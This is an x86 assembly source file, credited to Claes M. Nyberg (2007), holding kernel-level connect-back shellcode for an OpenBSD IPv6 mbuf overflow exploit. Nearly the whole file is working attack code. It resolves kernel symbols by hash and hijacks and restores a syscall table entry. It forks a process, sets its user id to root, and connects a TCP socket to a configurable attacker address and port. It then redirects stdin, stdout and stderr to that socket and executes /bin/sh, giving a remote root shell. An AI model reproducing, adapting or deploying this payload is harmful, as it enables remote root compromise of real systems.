 #
 # Connect back shellcode (OpenBSD IPv6 mbuf overflow).
 #
 #  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #     notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #     notice, this list of conditions and the following disclaimer in the
 #     documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #     derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 #

# Hash of symbols to resolve
.set HASH_sysent, 0xedcb2234
.set HASH_fork1, 0x06995591
.set HASH_copyout, 0xa53e4b2d

.set SYS_exit, 1
.set SYS_socket, 97
.set SYS_connect, 98
.set SYS_mmap, 197

# Maximum size of userland buffer
.set BUFSIZE, 4000

# Resolve syscall address from table
.macro get_syscall idx, reg
    movl   -8(%ebp), %ecx
    movl   \idx, \reg # Index
    movl   4(%ecx, \reg, 8), \reg
.endm

# Set syscall address in table
.macro set_syscall idx, addr
    movl   -8(%ebp), %ecx
    movl   \idx, %eax # Index
    movl   \addr, 4(%ecx, %eax, 8)
.endm

# Copy kernel memory to userland
.macro ucopy kaddr, uaddr, len
	# We save the kernel address in case %esp is used
    movl    \kaddr, %eax 
    pushl   \len
    pushl   \uaddr
    pushl   %eax
	call	*-4(%ebp) # copyout
    addl    $12, %esp
.endm

# Get PID of current process
.macro getpid proc, reg
	movl 52(\proc), \reg
.endm

.global connect_back_start
.global connect_back_end

#
# Start of command.
# The buffer we run in is prepended with
# 1) The address to the hash_resolve routine
# 2) The address of the real system call
# 3) The index of the system call
#
.text
connect_back_start:
	# Get our location
	call get_connect_back_start_location
	nop
	get_connect_back_start_location:

	# Point to start of code
	# to extract syscall information
	popl	%ecx
	subl	$5, %ecx

    pushl   %ebp
    movl    %esp, %ebp

	# hash_resolve -4(%ebp)
	pushl	-12(%ecx)

	# sysent -8(%ebp)
	pushl	$HASH_sysent
	call	*-4(%ebp)
	popl	%edx
	pushl	%eax

	# copyout -12(%ebp)
	pushl	$HASH_copyout
	call	*-4(%ebp)
	popl	%edx
	pushl	%eax

	# fork1 -16(%ebp)
	pushl	$HASH_fork1
	call	*-4(%ebp)
	popl	%edx
	pushl	%eax

	# Don't recover syscall if PID 0 (swapper)
	movl	8(%ebp), %eax
	getpid	%eax, %eax
	cmpl	$0, %eax
	je		call_real_syscall

	# Recover syscall
	movl	-4(%ecx), %edx # syscall address
	movl	-8(%ecx), %eax # Index
	set_syscall %eax, %edx

	# Call real syscall
	call_real_syscall:
		pushl	16(%ebp)	# retval
		pushl	12(%ebp)	# arg
		pushl	8(%ebp)		# curproc
		call	*%edx
		pushl	%eax		# Save return value

	# Don't fork1 from PID 0 (swapper)
	movl	8(%ebp), %eax
	getpid	%eax, %eax
	cmpl	$0, %eax
	je      syscall_finished

    xorl    %eax, %eax
    pushl   %eax
    pushl   %eax
    pushl   %eax
    jmp     connect_back_addr
    got_connect_back_addr:	# function
    pushl   %eax
    pushl   %eax
    pushl   $0x40		# FORK_NOZOMBIE
    pushl   %eax		# 0 = No signal
	pushl	8(%ebp)		# curproc
	movl	-16(%ebp), %eax
    call    *%eax
	addl	$36, %esp

	# Return value from real syscall
	syscall_finished:
		popl	%eax
		movl    %ebp, %esp
		popl    %ebp
		ret

# Get address to connect_back funktion below
connect_back_addr:
	call	got_connect_back_addr

# The new process starts here
# The argument is the address of curproc
.globl connect_back_ip
.globl connect_back_port
.globl connect_back_resolve_hash_offset

# Set uid to zero in process
.macro setuid_root proc
    movl    16(\proc), %eax   # struct pcred pointer
    movl    $0, 4(%eax)       # real user id.
.endm

connect_back:

    # Get our location
    call get_connect_back_location
    nop
    get_connect_back_location:

    # Point to start of code
    # to extract address to hash_resolve
    popl    %ecx
    subl    $5, %ecx

	connect_back_resolve_hash_offset:
	subl	$0x41424344, %ecx
	movl	(%ecx), %ecx

	pushl	%ebp
	movl	%esp, %ebp

	# copyout    -4(%ebp)
	pushl	$HASH_copyout
	call	*%ecx # hash_resolve
	movl	%eax, -4(%ebp)

	# sysent    -8(%ebp)
	pushl	$HASH_sysent
	call	*%ecx # hash_resolve
	movl    %eax, -8(%ebp)
	
	# socket descriptor -12(%ebp)
	pushl	%eax

	# hash_resolve -16(%ebp)
	pushl	%ecx

	# Allocate user space memory
	# sys_mmap(p, &{addr, len, prot, flags, fd, pad, pos}, retval)
	xorl	%eax, %eax
	pushl	%eax		# pos
	pushl	%eax		# pad
	pushl	$-1			# fd = -1
	pushl	$0x1002		# MAP_ANON|MAP_PRIVATE
	pushl	$0x7		# PROT_READ|PROT_WRITE|PROT_EXEC
	movl	$BUFSIZE, %ecx
	addl	$16, %ecx
	pushl	%ecx		# len 
	pushl	%eax		# addr
	movl	%esp, %ebx  # &margs
	
	pushl	%eax
	pushl	%eax
	movl	%esp, %esi	# retval

	pushl	%esi
	pushl	%ebx
	movl	8(%ebp), %ebx	# curproc
	pushl	%ebx
	get_syscall	$SYS_mmap, %eax
	call	*%eax

	test	%eax, %eax
	jnz		finished
	movl	(%esi), %edi # Buffer	

	# 8(%ebp) - curproc
	# %esi - retval
	# %edi - userland buffer

	# Make sure we run as UID 0
	setuid_root %ebx

	# Create socket
	xorl	%eax, %eax
	pushl	%eax	# protocol (0)
	incl	%eax
	pushl	%eax	# type 1 (SOCK_STREAM)
	incl	%eax
	pushl	%eax	# domain 2 (AF_INET)
	ucopy	%esp, %edi, $12	
	
	# sys_socket args
	pushl	%esi
	pushl	%edi
	pushl	%ebx

	get_syscall	$SYS_socket, %eax
	call	*%eax
	test    %eax, %eax
	jnz     exit_process

	# Save socket descriptor
	movl	(%esi), %eax
	movl	%eax, -12(%ebp)

	# Create IPv4 address
	xorl    %eax, %eax   # eax = 0
	pushl   %eax         # sin_zero
	pushl   %eax         # sin_zero[8]
	
	connect_back_ip:
	pushl   $0x41424344   # sin_addr.s_addr 

	connect_back_port:
	pushw   $0x4546      # Port
	movb    $0x02, %ah   # sin_family = AF_INET;
	pushw   %ax          # 0x0200
	ucopy   %esp, %edi, $16

	movl	%edi, %eax	 # address pointer
	addl	$16, %edi    # sys_connect argument pointer

	# sys_connect arguments
	pushl	$16			# namelen
	pushl	%eax		# (struct sockaddr *)
	pushl	-12(%ebp)	# socket descriptor
	ucopy   %esp, %edi, $12

	pushl	%esi
	pushl	%edi
	pushl	%ebx
	get_syscall $SYS_connect, %eax
	call	*%eax

	test    %eax, %eax
	jnz     exit_process

	# Execute shell
	pushl	-16(%ebp)	# hash_resolve
	pushl	-12(%ebp)	# Socket descriptor
	pushl	8(%ebp)		# curproc
	call	execve_shell

	test	%eax, %eax
	jz		finished

    exit_process:
        pushl   %esi
        pushl   %edi
        pushl   %ebx
        get_syscall $SYS_exit, %eax
        call    *%eax
		addl	$12, %esp

	finished:
		movl	%ebp, %esp
		popl	%ebp
		ret


#
# Execve shell.
# A fork1():ed process is the curproc, we return non-zero on failure to exit it.
# stage3(struct proc *curproc, int socket_fd, u_int (*hash_resolve)(char *hash)); 
# 8(%ebp)  - curproc
# 12(%ebp) - socket_fd
# 16(%ebp) - hash_resolve
#

.set HASH_sysent, 0xedcb2234
.set HASH_copyout, 0xa53e4b2d
.set SYS_execve, 59
.set SYS_dup2, 90
.set SYS_mmap, 197

.text
execve_shell:
	pushl   %ebp
	movl    %esp, %ebp

    # copyout    -4(%ebp)
    pushl   $HASH_copyout
    call    *16(%ebp)
    popl    %ecx
    pushl   %eax

    # sysent    -8(%ebp)
    pushl   $HASH_sysent
    call    *16(%ebp)
    popl    %ecx
    pushl   %eax

    pushl   %eax
    pushl   %eax
    movl    %esp, %esi  # retval

    # Allocate user space memory
    # sys_mmap(p, &{addr, len, prot, flags, fd, pad, pos}, retval)
    xorl    %eax, %eax
    pushl   %eax        # pos
    pushl   %eax        # pad
    pushl   $-1         # fd = -1
    pushl   $0x1002     # MAP_ANON|MAP_PRIVATE
    pushl   $0x7        # PROT_READ|PROT_WRITE|PROT_EXEC
    pushl   $1024       # len
    pushl   %eax        # addr
    movl    %esp, %ebx  # &margs

    pushl   %eax
    pushl   %eax
    movl    %esp, %esi  # retval

    pushl   %esi
    pushl   %ebx
    movl    8(%ebp), %ebx   # curproc
    pushl   %ebx
    get_syscall $SYS_mmap, %eax
    call    *%eax

    test    %eax, %eax
    jnz     finished
    movl    (%esi), %edi # Buffer

    # Set up IO
    xorl    %eax, %eax
    pushl   %eax        # STDIN_FILENO
    pushl   12(%ebp)    # socket descriptor
    ucopy   %esp, %edi, $8
    pushl   %esi	
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_dup2, %eax
    call    *%eax

    xorl    %eax, %eax
    incl    %eax
    pushl   %eax        # STDOUT_FILENO
    pushl   12(%ebp)    # socket descriptor
    ucopy   %esp, %edi, $8
    pushl   %esi
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_dup2, %eax
    call    *%eax

    xorl    %eax, %eax
    incl    %eax
    incl    %eax
    pushl   %eax        # STDERR_FILENO
    pushl   12(%ebp)    # socket descriptor
    ucopy   %esp, %edi, $8
    pushl   %esi
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_dup2, %eax
    call    *%eax

    test    %eax, %eax
    jnz     finished

    # Make sure we have zero:ed out memory for execve arguments
    addl    $60, %edi

    # Execve
    xorl    %eax, %eax
    pushl   %eax         # string end with NULL
    pushl   $0x68732f2f  # push 'hs//' (//sh)
    pushl   $0x6e69622f  # push 'nib/' (/bin)
    ucopy   %esp, %edi, $9
    xorl    %eax, %eax

    pushl   %eax        # NULL
    pushl   %edi        # string pointer
    addl    $10, %edi
    ucopy   %esp, %edi, $8 # %edi - argv

    xorl    %eax, %eax
    pushl   %eax        # envp = NULL
    pushl   %edi        # argv = {"/bin/sh", NULL}
    subl    $10, %edi
    pushl   %edi        # argv[0]
    addl    $24, %edi
    ucopy   %esp, %edi, $12

    pushl   %esi
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_execve, %eax
    call    *%eax

    # We are finished
	execve_shell_finished:
		movl	%ebp, %esp
		popl	%ebp
		ret

connect_back_end:
